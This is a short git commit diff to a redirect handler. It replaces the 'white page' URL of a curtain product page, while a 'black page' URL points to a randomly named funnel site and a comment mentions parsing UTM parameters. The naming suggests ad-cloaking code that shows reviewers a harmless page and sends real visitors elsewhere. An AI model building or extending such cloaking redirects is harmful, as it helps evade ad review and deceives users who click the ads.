9eeb77ecd34f1ffd4fa651403e1ccd239ed6900e
mahadzmn <mahadzaman05@gmail.com>
2025-01-31 16:40:20 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.rusticsforless.com/collections/drapes/products/copy-of-adirondack-drapes?variant=40515392634922";
+    const whitePageURL = "https://mazadecorstore.com/products/maza-decor-white-elegance-stylish-curtain-no-blackout-copia";
     const blackPageURL = "https://dnfiwbzxjq.myfunnelish.com/imbassd-1736979042571105-1737834191248667";
   
     // Parse the UTM parameters from the request URL
